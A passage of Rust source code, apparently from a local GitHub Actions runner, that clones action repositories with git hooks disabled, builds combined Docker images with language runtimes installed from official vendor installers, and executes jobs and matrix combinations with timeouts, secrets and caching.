async fn shallow_clone(
    repo_url: &str,
    git_ref: &str,
    target_dir: &Path,
) -> Result<(), ExecutionError> {
    let is_sha = is_git_sha(git_ref);

    // Disable git hooks for all operations — cloned repos are untrusted and
    // could contain malicious post-checkout / post-merge hooks.
    let no_hooks = ["-c", "core.hooksPath=/dev/null"];

    if is_sha {
        // SHA refs can't use --branch; use init + fetch + checkout instead
        let init = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("init")
            .arg(target_dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await
            .map_err(|e| ExecutionError::Execution(format!("Failed to execute git init: {}", e)))?;
        if !init.success() {
            return Err(ExecutionError::Execution(format!(
                "git init failed for {}",
                target_dir.display()
            )));
        }

        let fetch = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("-C")
            .arg(target_dir)
            .arg("fetch")
            .arg("--depth")
            .arg("1")
            .arg("--")
            .arg(repo_url)
            .arg(git_ref)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .output()
            .await
            .map_err(|e| {
                ExecutionError::Execution(format!("Failed to execute git fetch: {}", e))
            })?;
        if !fetch.status.success() {
            let stderr = String::from_utf8_lossy(&fetch.stderr);
            return Err(ExecutionError::Execution(format!(
                "Failed to fetch {}@{}: {}",
                repo_url,
                git_ref,
                stderr.trim()
            )));
        }

        let checkout = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("-C")
            .arg(target_dir)
            .arg("checkout")
            .arg("FETCH_HEAD")
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .output()
            .await
            .map_err(|e| {
                ExecutionError::Execution(format!("Failed to execute git checkout: {}", e))
            })?;
        if !checkout.status.success() {
            let stderr = String::from_utf8_lossy(&checkout.stderr);
            return Err(ExecutionError::Execution(format!(
                "Failed to checkout FETCH_HEAD for {}@{}: {}",
                repo_url,
                git_ref,
                stderr.trim()
            )));
        }
    } else {
        // Branch/tag refs: standard shallow clone
        let output = tokio::process::Command::new("git")
            .args(no_hooks)
            .arg("clone")
            .arg("--depth")
            .arg("1")
            .arg("--single-branch")
            .arg("--branch")
            .arg(git_ref)
            .arg("--")
            .arg(repo_url)
            .arg(target_dir)
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::piped())
            .output()
            .await
            .map_err(|e| ExecutionError::Execution(format!("Failed to execute git: {}", e)))?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            return Err(ExecutionError::Execution(format!(
                "Failed to clone {}@{}: {}",
                repo_url,
                git_ref,
                stderr.trim()
            )));
        }
    }

    Ok(())
}

/// Returns `true` if `git_ref` looks like a full SHA-1 hex hash (40 hex chars).
///
/// NOTE: This only detects SHA-1 (40 hex chars). Git's SHA-256 transition uses
/// 64-char hashes — update this check if/when GitHub adopts SHA-256 refs.
fn is_git_sha(git_ref: &str) -> bool {
    git_ref.len() == 40 && git_ref.chars().all(|c| c.is_ascii_hexdigit())
}

/// Determine the appropriate Docker image for a GitHub action.
///
/// Setup actions (from the `SETUP_ACTIONS` table) use the act runner base image
/// so that runtimes installed by the combined image build remain available.
/// Other well-known actions use exact-match or namespace-prefix matching.
fn determine_action_image(repository: &str) -> String {
    // Known setup actions run on the base runner image; their runtimes are
    // installed via resolve_runner_image's combined image build.
    if SETUP_ACTIONS.iter().any(|d| d.repos.contains(&repository)) {
        return "catthehacker/ubuntu:act-latest".to_string();
    }

    match repository {
        // Docker/container actions (namespace prefix)
        repo if repo.starts_with("docker/") => "docker:latest".to_string(),

        // AWS actions (namespace prefix)
        repo if repo.starts_with("aws-actions/") => "amazon/aws-cli:latest".to_string(),

        // Core GitHub actions that need a full environment
        "actions/checkout"
        | "actions/upload-artifact"
        | "actions/download-artifact"
        | "actions/cache" => "catthehacker/ubuntu:act-latest".to_string(),

        // Default to Node.js for other actions
        _ => "node:20-slim".to_string(),
    }
}

/// A runtime detected from a setup action step (e.g., `actions/setup-node@v3`).
struct SetupRuntime {
    /// Language identifier (e.g., "node", "php", "python")
    language: String,
    /// Sanitized version string (e.g., "20", "8.2")
    version: String,
    /// Shell commands to install this runtime on an Ubuntu base image
    install_script: String,
}

/// Definition of a known setup action for runtime detection.
///
/// Used by both `detect_setup_runtimes` (to build combined images) and
/// `determine_action_image` (to select per-step images), keeping the two
/// in sync automatically.
struct SetupActionDef {
    /// Repository names that map to this runtime (exact match, no @version suffix).
    repos: &'static [&'static str],
    /// The `with:` key that specifies the version.
    with_key: &'static str,
    /// Default version when no `with:` key is provided.
    default_version: &'static str,
    /// Language identifier used in install scripts and image tags.
    language: &'static str,
    /// If true, fall back to the @ref from the `uses:` field when no `with:` key is set.
    /// Used by `dtolnay/rust-toolchain` which encodes the toolchain in the ref.
    version_from_ref: bool,
}

const SETUP_ACTIONS: &[SetupActionDef] = &[
    SetupActionDef {
        repos: &["actions/setup-node"],
        with_key: "node-version",
        default_version: "20",
        language: "node",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["shivammathur/setup-php"],
        with_key: "php",
        default_version: "8.2",
        language: "php",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-python"],
        with_key: "python-version",
        default_version: "3.11",
        language: "python",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-go"],
        with_key: "go-version",
        default_version: "1.21",
        language: "go",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-java"],
        with_key: "java-version",
        default_version: "17",
        language: "java",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions/setup-dotnet"],
        with_key: "dotnet-version",
        default_version: "7.0",
        language: "dotnet",
        version_from_ref: false,
    },
    SetupActionDef {
        repos: &["actions-rs/toolchain", "dtolnay/rust-toolchain"],
        with_key: "toolchain",
        default_version: "stable",
        language: "rust",
        version_from_ref: true,
    },
];

/// Check that a version string contains only safe characters (alphanumeric, dots, hyphens, underscores).
fn is_safe_version(version: &str) -> bool {
    !version.is_empty()
        && version
            .chars()
            .all(|c| c.is_alphanumeric() || c == '.' || c == '-' || c == '_')
}

/// Scan job steps for known setup actions and return the runtimes they configure.
///
/// If the same language appears multiple times, only the last occurrence is kept
/// (matching GitHub Actions behavior where later setup steps override earlier ones).
fn detect_setup_runtimes(steps: &[Step]) -> Vec<SetupRuntime> {
    let mut runtimes: Vec<SetupRuntime> = Vec::new();

    for step in steps {
        let uses = match &step.uses {
            Some(u) => u,
            None => continue,
        };

        // Split "actions/setup-node@v3" into ("actions/setup-node", Some("v3"))
        let (repo, git_ref) = match uses.split_once('@') {
            Some((r, v)) => (r, Some(v)),
            None => (uses.as_str(), None),
        };

        let def = match SETUP_ACTIONS.iter().find(|d| d.repos.contains(&repo)) {
            Some(d) => d,
            None => continue,
        };

        let with = step.with.as_ref();
        let ver = with
            .and_then(|w| w.get(def.with_key))
            .cloned()
            .or_else(|| {
                // Some actions encode the version in the @ref (e.g., dtolnay/rust-toolchain@nightly).
                // Skip bare git SHAs — they pin the action version, not the toolchain.
                if def.version_from_ref {
                    git_ref.filter(|r| !is_git_sha(r)).map(|r| r.to_string())
                } else {
                    None
                }
            })
            .unwrap_or_else(|| def.default_version.to_string());

        // Normalize trailing ".x" suffix (e.g., "16.x" -> "16") so it doesn't
        // leak into install scripts for languages that don't expect it.
        let ver = if ver.ends_with(".x") {
            ver[..ver.len() - 2].to_string()
        } else {
            ver
        };

        if !is_safe_version(&ver) {
            wrkflw_logging::warning(&format!(
                "Ignoring {} with invalid version: {:?}",
                def.language, ver
            ));
            continue;
        }

        let rt = SetupRuntime {
            language: def.language.to_string(),
            version: ver.clone(),
            install_script: get_install_script(def.language, &ver),
        };

        // Deduplicate: later setup steps override earlier ones for the same language
        let existing_idx = runtimes.iter().position(|r| r.language == rt.language);
        if let Some(idx) = existing_idx {
            runtimes[idx] = rt;
        } else {
            runtimes.push(rt);
        }
    }

    runtimes
}

/// Return shell commands that install a language runtime on an Ubuntu base image.
fn get_install_script(language: &str, version: &str) -> String {
    match language {
        "node" => {
            // Strip .x suffix for nodesource URL (e.g., "16.x" -> "16")
            let major = version.split('.').next().unwrap_or(version);
            format!(
                "curl -fsSL https://deb.nodesource.com/setup_{}.x | bash - && apt-get install -y nodejs",
                major
            )
        }
        "php" => {
            format!(
                "apt-get install -y software-properties-common && \
                 add-apt-repository -y ppa:ondrej/php && apt-get update && \
                 apt-get install -y php{ver}-cli php{ver}-mbstring php{ver}-xml php{ver}-curl unzip && \
                 curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer",
                ver = version
            )
        }
        "python" => {
            format!(
                "apt-get install -y software-properties-common && \
                 add-apt-repository -y ppa:deadsnakes/ppa && apt-get update && \
                 apt-get install -y python{ver} python{ver}-venv && \
                 ln -sf /usr/bin/python{ver} /usr/bin/python && \
                 ln -sf /usr/bin/python{ver} /usr/bin/python3 && \
                 curl -sS https://bootstrap.pypa.io/get-pip.py | python{ver}",
                ver = version
            )
        }
        "go" => {
            format!(
                "ARCH=$(dpkg --print-architecture || echo amd64) && \
                 curl -fsSL https://go.dev/dl/go{}.linux-${{ARCH}}.tar.gz | tar -C /usr/local -xz && \
                 ln -s /usr/local/go/bin/go /usr/bin/go",
                version
            )
        }
        "java" => {
            format!(
                "apt-get install -y wget apt-transport-https gpg && \
                 wget -qO - https://packages.adoptium.net/artifactory/api/gpg/key/public | gpg --dearmor -o /usr/share/keyrings/adoptium.gpg && \
                 echo 'deb [signed-by=/usr/share/keyrings/adoptium.gpg] https://packages.adoptium.net/artifactory/deb $(cat /etc/os-release | grep UBUNTU_CODENAME | cut -d= -f2) main' > /etc/apt/sources.list.d/adoptium.list && \
                 apt-get update && apt-get install -y temurin-{}-jdk",
                version
            )
        }
        "dotnet" => {
            format!(
                "apt-get install -y wget && \
                 wget https://dot.net/v1/dotnet-install.sh -O /tmp/dotnet-install.sh && \
                 chmod +x /tmp/dotnet-install.sh && \
                 /tmp/dotnet-install.sh --channel {} --install-dir /usr/share/dotnet && \
                 ln -s /usr/share/dotnet/dotnet /usr/bin/dotnet",
                version
            )
        }
        "rust" => {
            format!(
                "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain {} && \
                 . $HOME/.cargo/env && \
                 ln -s $HOME/.cargo/bin/* /usr/local/bin/",
                version
            )
        }
        _ => String::new(),
    }
}

/// Generate a Dockerfile that installs multiple language runtimes on an Ubuntu base.
///
/// Extracted as a pure function so the output can be unit-tested without Docker.
fn generate_combined_dockerfile(runtimes: &[SetupRuntime], base_image: &str) -> String {
    let mut dockerfile = format!("FROM {}\n", base_image);

    // Combine base packages and all runtime install scripts into a single
    // RUN directive so there is only one `apt-get update` call and the Docker
    // layer cache works as a single unit.
    let scripts: Vec<&str> = runtimes
        .iter()
        .filter(|rt| !rt.install_script.is_empty())
        .map(|rt| rt.install_script.as_str())
        .collect();

    dockerfile.push_str("RUN apt-get update && \\\n");
    dockerfile.push_str(
        "    apt-get install -y --no-install-recommends curl bash git ca-certificates gnupg",
    );

    for script in &scripts {
        dockerfile.push_str(" && \\\n");
        dockerfile.push_str(&format!("    {}", script));
    }

    dockerfile.push_str(" && \\\n    rm -rf /var/lib/apt/lists/*\n");

    dockerfile
}

/// FNV-1a hash — deterministic across Rust toolchain versions, unlike `DefaultHasher`.
fn fnv1a_hash(data: &[u8]) -> u64 {
    const FNV_OFFSET_BASIS: u64 = 14695981039346656037;
    const FNV_PRIME: u64 = 1099511628211;
    let mut hash = FNV_OFFSET_BASIS;
    for &byte in data {
        hash ^= byte as u64;
        hash = hash.wrapping_mul(FNV_PRIME);
    }
    hash
}

/// Build a deterministic image tag from the Dockerfile content.
///
/// Includes a hash of the full Dockerfile so that changes to install scripts
/// (e.g., updated URLs) invalidate the cache even when language/version pairs
/// are unchanged.  Uses FNV-1a rather than `DefaultHasher` so the tag is
/// stable across Rust toolchain upgrades.
fn combined_image_tag(runtimes: &[SetupRuntime], dockerfile: &str) -> String {
    let mut tag_parts: Vec<String> = runtimes
        .iter()
        .map(|r| format!("{}{}", r.language, r.version))
        .collect();
    tag_parts.sort();

    let hash = fnv1a_hash(dockerfile.as_bytes());

    format!(
        "{}{}-{:x}",
        COMBINED_IMAGE_PREFIX,
        tag_parts.join("-"),
        hash
    )
}

/// Build a Docker image that combines multiple language runtimes on an Ubuntu base.
///
/// Skips the build when an image with the same tag already exists locally,
/// avoiding redundant work on repeated runs.
async fn build_combined_runtime_image(
    runtimes: &[SetupRuntime],
    base_image: &str,
    runtime: &dyn ContainerRuntime,
) -> Result<String, ExecutionError> {
    let dockerfile = generate_combined_dockerfile(runtimes, base_image);
    let tag = combined_image_tag(runtimes, &dockerfile);

    // Skip the build if the image already exists locally.
    let exists = runtime.image_exists(&tag).await.map_err(|e| {
        ExecutionError::Runtime(format!("Failed to check for existing image: {}", e))
    })?;
    if exists {
        wrkflw_logging::info(&format!("Reusing existing combined runtime image: {}", tag));
        return Ok(tag);
    }

    let temp_dir = tempfile::tempdir().map_err(|e| {
        ExecutionError::Execution(format!("Failed to create temp directory: {}", e))
    })?;

    let dockerfile_path = temp_dir.path().join("Dockerfile");
    std::fs::write(&dockerfile_path, &dockerfile)
        .map_err(|e| ExecutionError::Execution(format!("Failed to write Dockerfile: {}", e)))?;

    wrkflw_logging::info(&format!(
        "Building combined runtime image with: {}",
        runtimes
            .iter()
            .map(|r| r.language.as_str())
            .collect::<Vec<_>>()
            .join(", ")
    ));

    runtime
        .build_image(&dockerfile_path, &tag, temp_dir.path())
        .await
        .map_err(|e| {
            ExecutionError::Runtime(format!("Failed to build combined runtime image: {}", e))
        })?;

    Ok(tag)
}

/// Determine the effective runner image for a job, taking setup actions into account.
///
/// If the job has an explicit `container:` config, that takes precedence.
/// Otherwise, scans steps for setup actions and builds a combined image that
/// installs the detected runtimes on top of the runner base image (which
/// includes git and other tools needed by actions like `actions/checkout`).
async fn resolve_runner_image(
    job: &Job,
    runtime: &dyn ContainerRuntime,
) -> Result<String, ExecutionError> {
    let base_image = get_effective_runner_image(job);

    if job.container.is_some() {
        return Ok(base_image);
    }

    let setup_runtimes = detect_setup_runtimes(&job.steps);
    if setup_runtimes.is_empty() {
        Ok(base_image)
    } else {
        // Always build a combined image on the runner base so that essential
        // tools (git, curl, etc.) remain available for actions like checkout.
        build_combined_runtime_image(&setup_runtimes, &base_image, runtime).await
    }
}

#[allow(clippy::too_many_arguments)]
async fn execute_job_batch(
    jobs: &[String],
    workflow: &WorkflowDefinition,
    runtime: &dyn ContainerRuntime,
    env_context: &HashMap<String, String>,
    verbose: bool,
    secret_manager: Option<&SecretManager>,
    secret_masker: Option<&SecretMasker>,
    all_job_outputs: &HashMap<String, HashMap<String, String>>,
    all_job_results: &HashMap<String, String>,
    artifact_store: &crate::artifacts::ArtifactStore,
    cache_store: &crate::cache::CacheStore,
) -> Result<Vec<JobResult>, ExecutionError> {
    // Execute jobs in parallel
    let futures = jobs.iter().map(|job_name| {
        execute_job_with_matrix(
            job_name,
            workflow,
            runtime,
            env_context,
            verbose,
            secret_manager,
            secret_masker,
            all_job_outputs,
            all_job_results,
            artifact_store,
            cache_store,
        )
    });
    // NOTE: execute_job_batch and execute_job_with_matrix retain their argument
    // lists because they sit at the boundary between per-run state (stores)
    // and per-job state (needs context, secrets). JobServices is constructed
    // per-job inside execute_job_with_matrix after resolving secrets.

    let result_arrays = future::join_all(futures).await;

    // Flatten the results from all jobs and their matrix combinations
    let mut results = Vec::new();
    for result_array in result_arrays {
        match result_array {
            Ok(job_results) => results.extend(job_results),
            Err(e) => return Err(e),
        }
    }

    Ok(results)
}

// Before execute_job_with_matrix implementation, add this struct
struct JobExecutionContext<'a> {
    job_name: &'a str,
    workflow: &'a WorkflowDefinition,
    runtime: &'a dyn ContainerRuntime,
    env_context: &'a HashMap<String, String>,
    verbose: bool,
    services: JobServices<'a>,
}

/// Execute a job, expanding matrix if present
#[allow(clippy::too_many_arguments)]
async fn execute_job_with_matrix(
    job_name: &str,
    workflow: &WorkflowDefinition,
    runtime: &dyn ContainerRuntime,
    env_context: &HashMap<String, String>,
    verbose: bool,
    secret_manager: Option<&SecretManager>,
    secret_masker: Option<&SecretMasker>,
    all_job_outputs: &HashMap<String, HashMap<String, String>>,
    all_job_results: &HashMap<String, String>,
    artifact_store: &crate::artifacts::ArtifactStore,
    cache_store: &crate::cache::CacheStore,
) -> Result<Vec<JobResult>, ExecutionError> {
    // NOTE: This function still has many arguments because it sits at the boundary
    // between per-run state (artifact_store, cache_store) and per-job state (needs
    // context, secrets). It constructs JobServices internally after resolving secrets.
    // Get the job definition
    let job = workflow.jobs.get(job_name).ok_or_else(|| {
        ExecutionError::Execution(format!("Job '{}' not found in workflow", job_name))
    })?;

    // Evaluate job condition if present
    if let Some(if_condition) = &job.if_condition {
        let should_run = evaluate_job_condition(if_condition, env_context, workflow);
        if !should_run {
            wrkflw_logging::info(&format!(
                "{} Skipping job '{}' due to condition: {}",
                wrkflw_logging::symbols::SKIPPED,
                job_name,
                if_condition
            ));
            // Return a skipped job result
            return Ok(vec![JobResult {
                name: job_name.to_string(),
                canonical_name: job_name.to_string(),
                status: JobStatus::Skipped,
                steps: Vec::new(),
                logs: String::new(),
                outputs: HashMap::new(),
            }]);
        }
    }

    // Build filtered needs context for this job (only jobs declared in `needs:`)
    let (needs_ctx, needs_res) = build_needs_context(job, all_job_outputs, all_job_results);

    // Pre-resolve secrets once for this job (shared across matrix combinations and non-matrix path)
    let secrets_context: HashMap<String, String> = if let Some(secret_mgr) = secret_manager {
        resolve_secrets_for_context(secret_mgr, job).await
    } else {
        HashMap::new()
    };

    // Check if this is a matrix job
    if let Some(matrix_config) = job.matrix_config() {
        // Expand the matrix into combinations
        let combinations = wrkflw_matrix::expand_matrix(matrix_config)
            .map_err(|e| ExecutionError::Execution(format!("Failed to expand matrix: {}", e)))?;

        if combinations.is_empty() {
            wrkflw_logging::info(&format!(
                "Matrix job '{}' has no valid combinations",
                job_name
            ));
            // Return empty result for jobs with no valid combinations
            return Ok(Vec::new());
        }

        wrkflw_logging::info(&format!(
            "Matrix job '{}' expanded to {} combinations",
            job_name,
            combinations.len()
        ));

        // Set maximum parallel jobs
        let max_parallel = job.max_parallel().unwrap_or_else(|| {
            // If not specified, use a reasonable default based on CPU cores
            std::cmp::max(1, num_cpus::get())
        });

        let services = JobServices {
            secret_manager,
            secret_masker,
            secrets_context: &secrets_context,
            needs_context: &needs_ctx,
            needs_results: &needs_res,
            artifact_store,
            cache_store,
        };

        // Execute matrix combinations
        execute_matrix_combinations(MatrixExecutionContext {
            job_name,
            job_template: job,
            combinations: &combinations,
            max_parallel,
            fail_fast: job.fail_fast(),
            workflow,
            runtime,
            env_context,
            verbose,
            services,
        })
        .await
    } else {
        // Regular job, no matrix
        let services = JobServices {
            secret_manager,
            secret_masker,
            secrets_context: &secrets_context,
            needs_context: &needs_ctx,
            needs_results: &needs_res,
            artifact_store,
            cache_store,
        };
        let ctx = JobExecutionContext {
            job_name,
            workflow,
            runtime,
            env_context,
            verbose,
            services,
        };
        let result = execute_job(ctx).await?;
        Ok(vec![result])
    }
}

#[allow(unused_variables, unused_assignments)]
async fn execute_job(ctx: JobExecutionContext<'_>) -> Result<JobResult, ExecutionError> {
    // Get job definition
    let job = ctx.workflow.jobs.get(ctx.job_name).ok_or_else(|| {
        ExecutionError::Execution(format!("Job '{}' not found in workflow", ctx.job_name))
    })?;

    // Handle reusable workflow jobs (job-level 'uses')
    if let Some(uses) = &job.uses {
        return execute_reusable_workflow_job(&ctx, uses, job.with.as_ref(), job.secrets.as_ref())
            .await;
    }

    // Clone context and add job-specific variables
    let mut job_env = ctx.env_context.clone();

    // Add container-level environment variables (lowest precedence)
    if let Some(ref container) = job.container {
        warn_unsupported_container_fields(container);
        for (key, value) in &container.env {
            job_env.entry(key.clone()).or_insert_with(|| value.clone());
        }
    }

    // Add job-level environment variables (overrides container env)
    for (key, value) in &job.env {
        job_env.insert(key.clone(), value.clone());
    }

    // Add job-specific context
    environment::add_job_context(&mut job_env, ctx.job_name);

    // Create a temporary directory for this job execution
    let job_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create job directory: {}", e)))?;

    // Get the current project directory
    let current_dir = std::env::current_dir().map_err(|e| {
        ExecutionError::Execution(format!("Failed to get current directory: {}", e))
    })?;

    wrkflw_logging::info(&format!("Executing job: {}", ctx.job_name));

    let mut job_success = true;

    // Execute job steps
    // Determine runner image: prefer job container, then detect setup actions, fall back to runs-on
    let runner_image_value = resolve_runner_image(job, ctx.runtime).await?;

    // GHA default job timeout is 360 minutes; sanitize to avoid panic on negative/NaN
    let timeout_mins = sanitize_timeout_minutes(job.timeout_minutes, 360.0);
    let job_timeout = std::time::Duration::from_secs_f64(timeout_mins * 60.0);

    let mut loop_state = StepLoopState::new();
    let pending_cache_saves = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());

    let job_deadline = tokio::time::Instant::now() + job_timeout;

    for (idx, step) in job.steps.iter().enumerate() {
        let remaining = job_deadline.saturating_duration_since(tokio::time::Instant::now());

        let outcome = match tokio::time::timeout(
            remaining,
            run_step_with_guards(
                step,
                idx,
                &job_env,
                ctx.workflow,
                StepExecutionContext {
                    step,
                    step_idx: idx,
                    job_env: &job_env,
                    working_dir: job_dir.path(),
                    runtime: ctx.runtime,
                    workflow: ctx.workflow,
                    runner_image: &runner_image_value,
                    verbose: ctx.verbose,
                    matrix_combination: &None,
                    container_config: job.container.as_ref(),
                    workflow_defaults: ctx.workflow.defaults.as_ref(),
                    job_defaults: job.defaults.as_ref(),
                    step_outputs: &loop_state.step_outputs_map,
                    step_statuses: &loop_state.step_status_map,
                    job_status: &loop_state.job_status_str,
                    services: JobServices {
                        secret_manager: ctx.services.secret_manager,
                        secret_masker: ctx.services.secret_masker,
                        secrets_context: ctx.services.secrets_context,
                        needs_context: ctx.services.needs_context,
                        needs_results: ctx.services.needs_results,
                        artifact_store: ctx.services.artifact_store,
                        cache_store: ctx.services.cache_store,
                    },
                    pending_cache_saves: &pending_cache_saves,
                },
            ),
        )
        .await
        {
            Ok(result) => result?,
            Err(_) => {
                let msg = format!(
                    "Job '{}' exceeded timeout of {} minutes",
                    ctx.job_name, timeout_mins
                );
                wrkflw_logging::error(&msg);
                loop_state.job_logs.push_str(&format!("\n{}\n", msg));
                job_success = false;
                break;
            }
        };

        if loop_state.process_outcome(
            outcome,
            step,
            ctx.verbose,
            &mut job_env,
            ctx.services.secret_masker,
        ) {
            job_success = false;
            break;
        }
    }

    // Flush deferred cache saves only on success (matches GHA post-step semantics)
    if job_success {
        flush_pending_cache_saves(&pending_cache_saves, ctx.services.cache_store).await;
    }

    // Resolve job outputs from step outputs (GHA jobs.*.outputs map expressions to step outputs)
    let job_outputs = resolve_job_outputs(
        job,
        &loop_state.step_outputs_map,
        &loop_state.step_status_map,
        &job_env,
        &loop_state.job_status_str,
        &current_dir,
    );

    Ok(JobResult {
        name: ctx.job_name.to_string(),
        canonical_name: ctx.job_name.to_string(),
        status: if job_success {
            JobStatus::Success
        } else {
            JobStatus::Failure
        },
        steps: loop_state.step_results,
        logs: loop_state.job_logs,
        outputs: job_outputs,
    })
}

// Before the execute_matrix_combinations function, add this struct
struct MatrixExecutionContext<'a> {
    job_name: &'a str,
    job_template: &'a Job,
    combinations: &'a [MatrixCombination],
    max_parallel: usize,
    fail_fast: bool,
    workflow: &'a WorkflowDefinition,
    runtime: &'a dyn ContainerRuntime,
    env_context: &'a HashMap<String, String>,
    verbose: bool,
    services: JobServices<'a>,
}

/// Execute a set of matrix combinations
async fn execute_matrix_combinations(
    ctx: MatrixExecutionContext<'_>,
) -> Result<Vec<JobResult>, ExecutionError> {
    let mut results = Vec::new();
    let mut any_failed = false;

    // Process combinations in chunks limited by max_parallel
    for chunk in ctx.combinations.chunks(ctx.max_parallel) {
        // Skip processing if fail-fast is enabled and a previous job failed
        if ctx.fail_fast && any_failed {
            // Add skipped results for remaining combinations
            for combination in chunk {
                let combination_name =
                    wrkflw_matrix::format_combination_name(ctx.job_name, combination);
                results.push(JobResult {
                    name: combination_name,
                    canonical_name: ctx.job_name.to_string(),
                    status: JobStatus::Skipped,
                    steps: Vec::new(),
                    logs: "Job skipped due to previous matrix job failure".to_string(),
                    outputs: HashMap::new(),
                });
            }
            continue;
        }

        // Process this chunk of combinations in parallel
        let chunk_futures = chunk.iter().map(|combination| {
            execute_matrix_job(
                ctx.job_name,
                ctx.job_template,
                combination,
                ctx.workflow,
                ctx.runtime,
                ctx.env_context,
                ctx.verbose,
                &ctx.services,
            )
        });

        let chunk_results = future::join_all(chunk_futures).await;

        // Process results from this chunk
        for result in chunk_results {
            match result {
                Ok(job_result) => {
                    if job_result.status == JobStatus::Failure {
                        any_failed = true;
                    }
                    results.push(job_result);
                }
                Err(e) => {
                    // On error, mark as failed and continue if not fail-fast
                    any_failed = true;
                    wrkflw_logging::error(&format!("Matrix job failed: {}", e));

                    if ctx.fail_fast {
                        return Err(e);
                    }
                }
            }
        }
    }

    Ok(results)
}

/// Execute a single matrix job combination
#[allow(clippy::too_many_arguments)]
async fn execute_matrix_job(
    job_name: &str,
    job_template: &Job,
    combination: &MatrixCombination,
    workflow: &WorkflowDefinition,
    runtime: &dyn ContainerRuntime,
    base_env_context: &HashMap<String, String>,
    verbose: bool,
    services: &JobServices<'_>,
) -> Result<JobResult, ExecutionError> {
    // Create the matrix-specific job name
    let matrix_job_name = wrkflw_matrix::format_combination_name(job_name, combination);

    wrkflw_logging::info(&format!("Executing matrix job: {}", matrix_job_name));

    // Clone the environment and add matrix-specific values
    let mut job_env = base_env_context.clone();
    environment::add_matrix_context(&mut job_env, combination);

    // Add container-level environment variables (lowest precedence)
    if let Some(ref container) = job_template.container {
        warn_unsupported_container_fields(container);
        for (key, value) in &container.env {
            job_env.entry(key.clone()).or_insert_with(|| value.clone());
        }
    }

    // Add job-level environment variables (overrides container env).
    // Substitute ${{ matrix.* }} and other expression references in env values
    // so that e.g. `MY_VAR: ${{ matrix.os }}` resolves correctly.
    // We collect resolved values first to avoid borrowing job_env while mutating it.
    {
        let matrix_opt = Some(combination.values.clone());
        let env_expr_ctx = crate::expression::ExpressionContext {
            env_context: &job_env,
            step_outputs: &HashMap::new(),
            matrix_combination: &matrix_opt,
            step_statuses: &HashMap::new(),
            job_status: "success",
            secrets_context: services.secrets_context,
            needs_context: services.needs_context,
            needs_results: services.needs_results,
        };
        let cwd = std::env::current_dir().map_err(|e| {
            ExecutionError::Execution(format!("Failed to get current directory: {}", e))
        })?;
        let resolved_env: Vec<(String, String)> = job_template
            .env
            .iter()
            .map(|(key, value)| {
                let resolved =
                    crate::substitution::preprocess_expressions(value, &cwd, &env_expr_ctx)
                        .unwrap_or_else(|_| value.clone());
                (key.clone(), resolved)
            })
            .collect();
        for (key, value) in resolved_env {
            job_env.insert(key, value);
        }
    }

    // Create a temporary directory for this job execution
    let job_dir = tempfile::tempdir()
        .map_err(|e| ExecutionError::Execution(format!("Failed to create job directory: {}", e)))?;

    // Get the current project directory
    let current_dir = std::env::current_dir().map_err(|e| {
        ExecutionError::Execution(format!("Failed to get current directory: {}", e))
    })?;

    let mut loop_state = StepLoopState::new();
    let pending_cache_saves = std::sync::Mutex::new(Vec::<PendingCacheSave>::new());
    let job_success = if job_template.steps.is_empty() {
        wrkflw_logging::warning(&format!("Job '{}' has no steps", matrix_job_name));
        true
    } else {
        // Execute each step
        // Determine runner image: prefer job container, then detect setup actions, fall back to runs-on
        let runner_image_value = resolve_runner_image(job_template, runtime).await?;

        let mut all_steps_ok = true;
        let timeout_mins = sanitize_timeout_minutes(job_template.timeout_minutes, 360.0);
        let job_timeout = std::time::Duration::from_secs_f64(timeout_mins * 60.0);
        let job_deadline = tokio::time::Instant::now() + job_timeout;

        for (idx, step) in job_template.steps.iter().enumerate() {
            let remaining = job_deadline.saturating_duration_since(tokio::time::Instant::now());

            let outcome = match tokio::time::timeout(
                remaining,
                run_step_with_guards(
                    step,
                    idx,
                    &job_env,
                    workflow,
                    StepExecutionContext {
                        step,
                        step_idx: idx,
                        job_env: &job_env,
                        working_dir: job_dir.path(),
                        runtime,
                        workflow,
                        runner_image: &runner_image_value,
                        verbose,
                        matrix_combination: &Some(combination.values.clone()),
                        container_config: job_template.container.as_ref(),
                        workflow_defaults: workflow.defaults.as_ref(),
                        job_defaults: job_template.defaults.as_ref(),
                        step_outputs: &loop_state.step_outputs_map,
                        step_statuses: &loop_state.step_status_map,
                        job_status: &loop_state.job_status_str,
                        services: JobServices {
                            secret_manager: services.secret_manager,
                            secret_masker: services.secret_masker,
                            secrets_context: services.secrets_context,
                            needs_context: services.needs_context,
                            needs_results: services.needs_results,
                            artifact_store: services.artifact_store,
                            cache_store: services.cache_store,
                        },
                        pending_cache_saves: &pending_cache_saves,
                    },
                ),
            )
            .await
            {
                Ok(result) => result?,
                Err(_) => {
                    let msg = format!(
                        "Job '{}' exceeded timeout of {} minutes",
                        matrix_job_name, timeout_mins
                    );
                    wrkflw_logging::error(&msg);
                    loop_state.job_logs.push_str(&format!("\n{}\n", msg));
                    all_steps_ok = false;
                    break;
                }
            };

            if loop_state.process_outcome(
                outcome,
                step,
                verbose,
                &mut job_env,
                services.secret_masker,
            ) {
                all_steps_ok = false;
                break;
            }
        }

        all_steps_ok
    };

    // Flush deferred cache saves only on success (matches GHA post-step semantics)
    if job_success {
        flush_pending_cache_saves(&pending_cache_saves, services.cache_store).await;
    }

    // Resolve job outputs from step outputs
    let job_outputs = resolve_job_outputs(
        job_template,
        &loop_state.step_outputs_map,
        &loop_state.step_status_map,
        &job_env,
        &loop_state.job_status_str,
        &current_dir,
    );

